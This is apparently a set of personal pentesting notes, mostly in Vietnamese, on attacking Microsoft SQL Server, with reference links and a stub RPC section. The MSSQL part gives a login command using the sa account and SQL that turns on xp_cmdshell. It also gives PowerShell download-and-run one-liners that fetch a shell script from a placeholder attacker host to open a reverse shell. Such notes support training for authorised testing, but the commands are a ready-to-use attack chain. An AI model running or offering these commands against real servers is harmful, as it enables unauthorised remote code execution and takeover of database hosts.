**1. MSSQL**
- https://github.com/MalekAlthubiany/impacket-mssqlclient-OSCP
- https://www.offensivecyberprofessional.com/mssqlclient-py/
- https://exploit-notes.hdks.org/exploit/database/mssql/
- https://red.infiltr8.io/network-pentesting/protocols/mssql#post-exploit
- https://pentesting.site/exploitation-of-ports-and-services/port-1433-mssql/
- https://github.com/ivanversluis/pentest-hacktricks/blob/master/pentesting/pentesting-mssql-microsoft-sql-server.md
- https://www.hackingarticles.in/mssql-for-pentester-metasploit/
- http://michalszalkowski.com/security/pentesting-ports/1433-mssql/
- Login: `impacket-mssqlclient 192.168.1.109:1433 -U sa -P 'P@ssw0rd123'`
- Sau khi login:
```
-- Kiểm tra có quyền sysadmin không 
SELECT IS_SRVROLEMEMBER('sysadmin');

-- List tất cả database
SELECT name FROM sys.databases;

-- Chuyển sang database muốn dùng
USE master;  -- hoặc msdb, hoặc database nào bạn thấy

-- Kiểm tra xp_cmdshell đã bật chưa
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Nếu chưa bật và có quyền sysadmin → bật nó lên
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Chạy lệnh Windows (reverse shell ví dụ)
EXEC xp_cmdshell 'powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(''http://your-ip:8000/shell.ps1'')"';
```
- xp_cmdshell có sẵn trong Microsoft SQL Server, cho phép thực thi lệnh hệ điều hành Windows (command shell) trực tiếp từ trong SQL Server.
- Chức năng: Chạy bất kỳ lệnh nào mà cmd.exe có thể chạy
- Ví dụ:
```
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'dir c:\'
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"'
```
-

**2. RPC**
- https://medium.com/@omaymaW/lateral-movement-in-active-directory-windows-and-linux-tools-part-1-e926daddafc9
- https://undercodetesting.com/detecting-modern-lateral-movement-dcom-rpc-and-rdp-attack-vectors/
